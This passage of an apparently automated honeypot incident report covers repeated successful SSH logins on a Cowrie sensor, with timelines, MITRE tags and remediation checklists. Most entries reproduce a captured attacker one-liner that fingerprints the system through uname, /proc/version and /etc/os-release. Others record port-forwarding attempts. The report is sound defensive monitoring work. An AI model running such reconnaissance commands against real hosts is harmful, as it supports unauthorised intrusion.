| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:43:00` | `cowrie.log.closed` |
| `2026-09-03 10:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9bf4e86519c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:44 |
| **Last Seen** | 2026-09-03 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:44:05` | `cowrie.session.connect` |
| `2026-09-03 10:44:05` | `cowrie.client.version` |
| `2026-09-03 10:44:05` | `cowrie.client.kex` |
| `2026-09-03 10:44:06` | `cowrie.login.success` |
| `2026-09-03 10:44:06` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:44:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:44:07` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef17681ed40c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:44 |
| **Last Seen** | 2026-09-03 10:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:44:10` | `cowrie.session.connect` |
| `2026-09-03 10:44:11` | `cowrie.client.version` |
| `2026-09-03 10:44:11` | `cowrie.client.kex` |
| `2026-09-03 10:44:11` | `cowrie.login.success` |
| `2026-09-03 10:44:13` | `cowrie.session.params` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.success` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.command.input` |
| `2026-09-03 10:44:13` | `cowrie.log.closed` |
| `2026-09-03 10:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88455f3d4a25

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:45 |
| **Last Seen** | 2026-09-03 10:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:45:19` | `cowrie.session.connect` |
| `2026-09-03 10:45:20` | `cowrie.client.version` |
| `2026-09-03 10:45:20` | `cowrie.client.kex` |
| `2026-09-03 10:45:21` | `cowrie.login.success` |
| `2026-09-03 10:45:22` | `cowrie.session.params` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.success` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.command.input` |
| `2026-09-03 10:45:22` | `cowrie.log.closed` |
| `2026-09-03 10:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83d0976b0ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:46 |
| **Last Seen** | 2026-09-03 10:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:46:24` | `cowrie.session.connect` |
| `2026-09-03 10:46:24` | `cowrie.client.version` |
| `2026-09-03 10:46:24` | `cowrie.client.kex` |
| `2026-09-03 10:46:25` | `cowrie.login.success` |
| `2026-09-03 10:46:27` | `cowrie.session.params` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.success` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.command.input` |
| `2026-09-03 10:46:27` | `cowrie.log.closed` |
| `2026-09-03 10:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461e16c3ed82

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:46 |
| **Last Seen** | 2026-09-03 10:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:46:31` | `cowrie.session.connect` |
| `2026-09-03 10:46:31` | `cowrie.client.version` |
| `2026-09-03 10:46:32` | `cowrie.client.kex` |
| `2026-09-03 10:46:33` | `cowrie.login.success` |
| `2026-09-03 10:46:33` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:46:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:46:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb983af9cc03

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:47 |
| **Last Seen** | 2026-09-03 10:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:47:30` | `cowrie.session.connect` |
| `2026-09-03 10:47:30` | `cowrie.client.version` |
| `2026-09-03 10:47:30` | `cowrie.client.kex` |
| `2026-09-03 10:47:31` | `cowrie.login.success` |
| `2026-09-03 10:47:33` | `cowrie.session.params` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.success` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.command.input` |
| `2026-09-03 10:47:33` | `cowrie.log.closed` |
| `2026-09-03 10:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc993f73b32

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:48 |
| **Last Seen** | 2026-09-03 10:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:48:36` | `cowrie.session.connect` |
| `2026-09-03 10:48:36` | `cowrie.client.version` |
| `2026-09-03 10:48:36` | `cowrie.client.kex` |
| `2026-09-03 10:48:37` | `cowrie.login.success` |
| `2026-09-03 10:48:39` | `cowrie.session.params` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.success` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.command.input` |
| `2026-09-03 10:48:39` | `cowrie.log.closed` |
| `2026-09-03 10:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55caa03f77d4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:49 |
| **Last Seen** | 2026-09-03 10:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:49:45` | `cowrie.session.connect` |
| `2026-09-03 10:49:45` | `cowrie.client.version` |
| `2026-09-03 10:49:46` | `cowrie.client.kex` |
| `2026-09-03 10:49:46` | `cowrie.login.success` |
| `2026-09-03 10:49:47` | `cowrie.session.params` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.success` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:47` | `cowrie.command.input` |
| `2026-09-03 10:49:48` | `cowrie.log.closed` |
| `2026-09-03 10:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7eb08f7698

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:51 |
| **Last Seen** | 2026-09-03 10:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:51:00` | `cowrie.session.connect` |
| `2026-09-03 10:51:00` | `cowrie.client.version` |
| `2026-09-03 10:51:01` | `cowrie.client.kex` |
| `2026-09-03 10:51:02` | `cowrie.login.success` |
| `2026-09-03 10:51:03` | `cowrie.session.params` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.success` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.command.input` |
| `2026-09-03 10:51:03` | `cowrie.log.closed` |
| `2026-09-03 10:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c99ff8c0f4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:52 |
| **Last Seen** | 2026-09-03 10:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:52:19` | `cowrie.session.connect` |
| `2026-09-03 10:52:19` | `cowrie.client.version` |
| `2026-09-03 10:52:19` | `cowrie.client.kex` |
| `2026-09-03 10:52:20` | `cowrie.login.success` |
| `2026-09-03 10:52:21` | `cowrie.session.params` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.success` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.command.input` |
| `2026-09-03 10:52:21` | `cowrie.log.closed` |
| `2026-09-03 10:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85cb5326dfc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:53 |
| **Last Seen** | 2026-09-03 10:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:53:31` | `cowrie.session.connect` |
| `2026-09-03 10:53:31` | `cowrie.client.version` |
| `2026-09-03 10:53:32` | `cowrie.client.kex` |
| `2026-09-03 10:53:32` | `cowrie.login.success` |
| `2026-09-03 10:53:33` | `cowrie.session.params` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.success` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:33` | `cowrie.command.input` |
| `2026-09-03 10:53:34` | `cowrie.log.closed` |
| `2026-09-03 10:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a958464cc2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:53 |
| **Last Seen** | 2026-09-03 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:53:36` | `cowrie.session.connect` |
| `2026-09-03 10:53:36` | `cowrie.client.version` |
| `2026-09-03 10:53:36` | `cowrie.client.kex` |
| `2026-09-03 10:53:37` | `cowrie.login.success` |
| `2026-09-03 10:53:37` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:53:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:53:37` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3317072d52c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:54 |
| **Last Seen** | 2026-09-03 10:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:54:45` | `cowrie.session.connect` |
| `2026-09-03 10:54:45` | `cowrie.client.version` |
| `2026-09-03 10:54:45` | `cowrie.client.kex` |
| `2026-09-03 10:54:46` | `cowrie.login.success` |
| `2026-09-03 10:54:47` | `cowrie.session.params` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.success` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.command.input` |
| `2026-09-03 10:54:47` | `cowrie.log.closed` |
| `2026-09-03 10:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8c1c727a01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:55 |
| **Last Seen** | 2026-09-03 10:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
